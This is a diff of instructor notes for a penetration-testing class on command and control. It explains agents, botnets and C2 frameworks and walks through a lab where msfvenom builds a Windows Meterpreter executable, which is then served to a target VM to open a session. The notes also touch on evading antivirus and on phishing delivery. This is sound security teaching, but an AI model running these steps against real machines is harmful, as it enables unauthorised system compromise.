@@ -32,13 +32,23 @@ Students should have an understanding of the cyber 'kill chain' in which today w
 
 When an attacker compromises a computer, they directly control that machine. Throughout the cyber kill chain, an attacker will compromise several machines, which means several machines are then communicating with that single attacking machine. This is know as 'command and control'.
 
-In a traditional C2 architecture, multiple compromised machines, also known as "zombies", communicate with a single C2 'framework', hosted on a machine. 
+Explain to students that we will discuss two things: C2 Architecture and C2 frameworks. 
 
-- C2 architecture has evolved signficiantly over the past decade so that the true C2 server is concealed through various methods, instead of a direct Server -> Host architecture.
+- C2 architecture is made up of two things: the C2 server and the C2's agents. An "Agent" is just the payload that is run on the machine in order to open up a connection back to the C2 server. C2 Architecture is how the C2 server is setup and how the agent communicates back to the C2 server. 
 
-- In order to communicate back to the C2 server, the compromised machine must run an 'agent', which typically is a malicious executable or code that runs on the target machine.
+- A C2 framework is the actual program that controls the agents on the compromised machine. There are various types of C2 frameworks that we will learn about, but for this class our C2 framework will be Metasploit.
 
-- Most C2 frameworks support multiple different ways of connectivity, also known as "channels".
+
+
+In order to compromise a machine, the C2 agent needs to be run on it.
+
+- C2 agent is the malicious payload that is run on the target machine and ultimately is what is used to communicate back to the C2 server. Most C2 frameworks have an option to generate an agent. 
+
+Once the machine has the C2's agent running on it, it is now compromised and sometimes referred to as a "zombie". Multiple zombies form a "botnet". These compromised machines are then controlled through that single C2 server.
+
+Note: C2 architecture has evolved signficiantly over the past decade so that the true C2 server is concealed through various methods, instead of a direct Server -> Host architecture. For this class, we will focus on the direct architecture.
+
+- Most C2 frameworks support multiple different ways of how the agent communicates back with the server, also known as "channels".
 
 A compromised host can communicate using either a single channel or several channels over various protocols. Some of these protocols include
 
@@ -65,9 +75,19 @@ The C2 framework we will be using for this class is Metasploit. Metasploit is bo
 
 - We will cover the capabilities of the 'Meterpreter' shell later in the course.
 
+Explain to students that while we will only be using Metasploit in this class, most C2 frameworks are opensource which allow you to use them freely. It's considered good practice to have multiple C2 frameworks available for a penetration test or red team engagement.
+
+- C2 Frameworks each have their own "fingerprints" or "indicators of compromise"
+
+- For example, Metasploit's payload & agent generator, msfvenom, will generate a payload in a specified format (e.g. .Exe). These payloads have well known signatures that Antivirus products will alert on and kill the payload. 
+
+- In an event where a certain AV product is killing the payload, it would be a good idea to switch C2 frameworks.
+
+In addition, not all C2 frameworks support every OS. Some only support Windows and not Linux, for example. In this event, it's good to have a secondary C2 framework that supports an OS if the primary C2 framework doesn't support it. 
+
 ### 02. Student Do: Command and Control Framework research
 
-In this activity, students will research various C2 frameworks and document similiarities and differences between them. 
+In this activity, students will research various C2 frameworks in order to fit their upcoming penetration testing engagement.
 
 [Student Do Activity Link](01-C2Research.md)
 
@@ -75,7 +95,21 @@ Share the following link with students: https://www.thec2matrix.com/matrix
 
 [Student Do Solved Link](01-C2Research-Solved.md)
 
-### 03. Instructor Do: Metasploit Framework and msfvenom
+### 03. Instructor Do: Command and Control Framework Research Review
+
+One potential example is Cobalt Strike. It has the necessary logging, multitenancy capibilities and supports Windows machines which makes it an ideal fit for the customers environment. Since it does not support Linux machines, the secondary C2 could be Empire. 
+
+### 04. Instructor Do: C2 Recap
+
+Students should now have an understanding of what C2 is and how it is used throughout the entire penetration testing lifecycle. 
+
+Re-iterate that the C2 framework runs on a machine or server, and that machine or server then becomes the C2 server that the C2 agents communicate with. The penetration testers connect to the C2 server and are able to issue commands to the compromised computers through the agent's communication channel.
+
+We will now introduce the C2 framework they will be using throughout the class: Metasploit. 
+
+Before continuing to introduce Metasploit, ask if there are any questions.
+
+### 05. Instructor Do: Metasploit Framework and msfvenom
 
 Remind students that as shown in their research activity, there are many choices for C2. In this class, however, we will be focusing on using Metasploit.
 
@@ -85,7 +119,31 @@ Remind students that as shown in their research activity, there are many choices
 
 Metasploit has an additional component, msfvenom, which allows the operator to craft the malicious agents and payloads that will be used to communicate back with Metasploit.
 
-### 04. Instructor Do: Metasploit and msfvenom demonstration
+- Metasploit works through its use of "modules". There are many different types of modules, the main ones we will be focusing on in class are:
+
+1. Auxiliary - port scanners, fuzzers, sniffers, and more.
+
+2. Payloads - Payloads consist of code that runs remotely
+
+3. Encoders - encoders ensure that payloads make it to their destination intact
+
+4. Exploits - exploit modules are defined as modules that use payloads.
+
+5. Post - Modules used after an exploit module is successful. 
+
+
+### 06. Class Do: Metasploit and msfvenom demonstration
+
+This activity is meant to be done as a class. Slack out the following guide to students [Student Do: Metasploit and MSFVenom](02-Metasploit-Solved.md)
+
+Explain to students that we need to do two things in order to establish our C2 server and deploy our agent on the target.
+
+1. We first will need to load up Metasploit and start a "listener" that listens for the agent's communication
+
+2. We need to generate our agent using `msfvenom`
+
+
+#### Starting Metasploit 
 
 1. Login to the Kali machine with credentials `root/toor`
 
@@ -99,7 +157,7 @@ Explain to students that in order for the payload/agent we're going to craft to 
 
 - Without starting a listener, the C2 server will not be able to communicate with any agents.
 
-- Metasploit works through its use of "modules". In this case, we're using the `exploit/multi/handler` module which is Metasploit's listener module.
+- In this case, we're using the `exploit/multi/handler` module which is Metasploit's listener module.
 
 4. Type `ip addr` to get the IP address of the Kali machine, then type `set LHOST <kali ip address>`
 
@@ -109,9 +167,13 @@ Explain to students that in order for the payload/agent we're going to craft to 
 
 6. Once LPORT and LHOST is set, start the listener by typing `run -j`. The `-j` option sets it to run in background.
 
+Explain to students now that Metasploit listener is running, our Kali machine is now acting as a C2 server running Metasploit as a C2 framework. Now that we have our C2 server running, we need to generate an agent to be used.
+
 7. Next, generate the agent/payload by typing `msfvenom -p windows/meterpreter/bind_tcp RHOST= IP LPORT=PORT -f exe > shell.exe` 
 
 ![](/Images/02.Metasploitmsfvenom.PNG)
+
+Explain to students that since we've now created our agent in a .exe format, we need to transport it to the target some how. Typically in a real engagement, this is done through phishing or social engineering. For our demonstration, we will host it on a web server on our Kali machine. 
 
 8. Clear out the /var/www/html/ folder: `rm /var/www/html/*`
 
@@ -137,10 +199,12 @@ Explain to students that in order for the payload/agent we're going to craft to 
 
 We will explore the capabilities of the Meterpreter shell later in the course. 
 
-### 05. Student Do: Metasploit and MSFVenom
+### 07. Instructor Do: Metasploit Framework and msfvenom Recap
 
-In this activity, students will follow in the instructor's footpath and use Metasploit and MSFvenom to open a shell on their Windows VM.
+Explain to students that once the session is opened, the agent we created and executed is now communicating back to our C2 server (Kali/Metasploit). This demonstrates the basic C2 architecture style of Client -> server. 
 
-[Student Do Activity Link](02-Metasploit.md)
+- The agent is communicating with Metasploit and constatly looking for new instructions. When we issue a command, `ls` for example, the agent receives this command once it checks in. The agent will then run the command and send the output of the command back to Metasploit.
 
-[Student Do Solved Link](02-Metasploit-Solved.md)
+- We've now demonstrated the initial access portion of the penetration testing cycle. Explain that there are other ways and this demonstration does not factor in certain things like anti-virus or detection solutions.
+
+Answer any questions before continuing on.
